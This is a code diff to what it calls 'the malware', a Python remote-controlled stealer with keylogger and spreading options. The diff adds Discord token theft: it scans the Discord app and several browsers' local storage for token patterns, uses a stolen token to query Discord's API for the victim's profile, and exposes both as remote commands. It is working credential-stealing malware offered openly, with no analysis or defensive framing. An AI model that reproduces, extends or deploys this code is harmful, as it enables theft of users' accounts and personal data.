@@ -22,6 +22,7 @@ try:
     import sys
     import threading
     import datetime
+    import re
 except ImportError as _exception:
     # If there is import error.
 
@@ -101,7 +102,7 @@ KEYLOGGER_DISABLED = True
 SPREADING_SKIPPED_DRIVES = ("C", "D")
 
 # Version of the malware.
-VERSION = "[Pre-release] 0.4"
+VERSION = "[Pre-release] 0.4.2"
 
 
 def filesystem_get_size(_path: str) -> int:
@@ -771,11 +772,46 @@ def command_link(_arguments, _event) -> str:
 
 def command_drives(_arguments: str, _event) -> str:
     # @function command_drives()
-    # @returns None
+    # @returns Str
     # @description Function for command "drive" that returns list of the all drives in the system separated by ,(comma).
 
     # Returning.
     return ", ".join(filesystem_get_drives_list())
+
+def command_discord_tokens(_arguments: str, _event) -> str:
+    # @function command_discord_tokens()
+    # @returns Str
+    # @description Function for command "discord_tokens" that returns list of the all discord tokens founded in system ,(comma).
+
+    # Getting tokens.
+    _tokens = stealer_steal_discord_tokens()
+
+    if len(_tokens) == 0:
+        # If not found any tokens.
+
+        # Error.
+        return "Tokens not found in system!"
+
+    # Returning.
+    return ",\n".join(_tokens)
+
+
+def command_discord_profile(_arguments: str, _event) -> str:
+    # @function command_discord_profile()
+    # @returns Str
+    # @description Function for command "discord_profile" that returns information about discord found in system ,(comma).
+
+    # Getting tokens.
+    _tokens = stealer_steal_discord_tokens()
+
+    if len(_tokens) == 0:
+        # If not found any tokens.
+
+        # Error.
+        return "Tokens not found in system!"
+
+    # Returning.
+    return json.dumps(stealer_steal_discord_profile(_tokens), indent=2)
 
 
 def executable_get_extension() -> str:
@@ -1140,6 +1176,8 @@ def initialise_commands() -> None:
         "cd": command_cd,
         "ls": command_ls,
         "drives": command_drives,
+        "discord_tokens": command_discord_tokens,
+        "discord_profile": command_discord_profile,
         "tags_new": command_tags_new,
         "tags_add": command_tags_add,
         "shutdown": command_shutdown,
@@ -1732,6 +1770,98 @@ def load_name() -> None:
         __NAME = get_ip()["ip"]  # noqa
 
 
+def discord_api_call(method: str, params: dict, func, data, token: str) -> any:
+    # @description Calls Discord API method.
+
+    # This code is from -> gtihub.com/kirillzhosul/python-discord-token-grabber
+    # (My repo)
+
+    # Calling.
+    return func(
+        f"https://discord.com/api/{method}", 
+        params = params, 
+        headers = {
+            "Authorization": f"{token}",
+            "Content-Type": "application/json"
+        }, 
+        data = data
+    )
+
+
+def stealer_steal_discord_profile(_tokens: list[str]=None) -> dict:
+    # @function stealer_steal_discord_profile(_tokens: list[str]=None) -> dict
+    # @returns Dict or none
+    # @description Function that steals all profile information from victim Discord.
+
+    if _tokens is None:
+        # If tokens is not given.
+
+        # Grabbing tokens from system.
+        _tokens = stealer_steal_discord_tokens()
+
+    if len(_tokens) == 0:
+        # If not tokens.
+
+        # Returning None.
+        return None
+
+    # Returning API response.
+    return discord_api_call("users/@me", {}, requests.get, None, _tokens[0]).json()
+
+
+def stealer_steal_discord_tokens() -> list[str]:
+    # @function stealer_steal_discord_token()
+    # @returns List
+    # @description Function that steals all the tokens from discord.
+
+    # This code is from -> gtihub.com/kirillzhosul/python-discord-token-grabber
+    # (My repo)
+
+    # Modules.
+
+    # Paths where tokens exists.
+    paths = [
+        os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb",
+        os.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
+        os.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
+        os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
+        os.getenv("LOCALAPPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
+        os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
+        os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"
+    ]
+
+    # Tokens that we got.
+    tokens = []
+
+    for token_path in (path for path in paths if os.path.exists(path)):
+        # For existing paths.
+
+        for log_file in (file for file in os.listdir(token_path) if file.endswith(".log") or file.endswith(".ldb")):
+            # For log files in folder.
+
+            # Opening file.
+            file = open(f'{token_path}\\{log_file}', errors='ignore')
+
+            for line in [line.strip() for line in file.readlines() if line.strip()]:
+                # Getting all lines.
+
+                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    # Checking all regexs.
+
+                    for token in re.findall(regex, line):
+                        # Grabbing token.
+
+                        if "mfa." in token:
+                            # Adding token.
+                            tokens.append(token)
+
+            # Dont forgot to close file.
+            file.close()
+
+    # Returning not-same tokens.
+    return list(set(tokens))
+
+
 def stealer_steal_data(_force: bool = False):
     # @function stealer_steal_data()
     # @returns None
@@ -1788,7 +1918,10 @@ def stealer_steal_data(_force: bool = False):
                 __VALUES["directory_root"] = os.listdir(_drive + "\\")
                 __VALUES["directory_programfiles"] = os.listdir(_drive + "\\Program Files")
                 __VALUES["directory_programfiles86"] = os.listdir(_drive + "\\Program Files (x86)")
-
+                # Disable as may take too long time to execute?
+                #__VALUES["discord_tokens"] = stealer_steal_discord_tokens()
+                #__VALUES["discord_profile"] = stealer_steal_discord_profile(__VALUES["discord_tokens"])
+                
             # Building path.
             filesystem_build_path(_path)
 
